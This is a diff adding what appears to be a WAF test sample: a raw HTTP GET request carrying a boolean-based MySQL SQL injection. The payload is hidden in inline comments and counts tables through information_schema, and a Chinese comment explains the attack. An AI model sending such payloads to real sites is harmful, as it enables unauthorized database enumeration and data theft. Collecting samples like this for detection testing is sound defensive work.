@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_判断表数(内联注释)
+# 基于布尔注入,该SQL 注入语句的目的是查询数据库中的表数量，并通过 COUNT() 函数和信息架构表（information_schema.tables）进行条件筛选。其中，攻击者通过 and 运算符将原始 SQL 查询语句与注入的代码拼接起来，从而实现对数据库的非法操作和信息窃取。攻击者通过在 SQL 查询语句中注入一部分代码，从而实现对数据库的非法操作和信息窃取。
+GET /?id=1%20and%20%2F%2A%21select%20count%28table_name%29%20from%20information_schema.tables%20where%20table_schema=database%28%29%20%3E%2010%2A%2F&bid=hd_tag_m8mv26ht HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ht
+RM-PRO-Token: 7acdddf1a8ec4d05170484d79bb19f4b
+RM-PRO-Time: 1742808619828
+User-Agent: curl/7.83.1
+
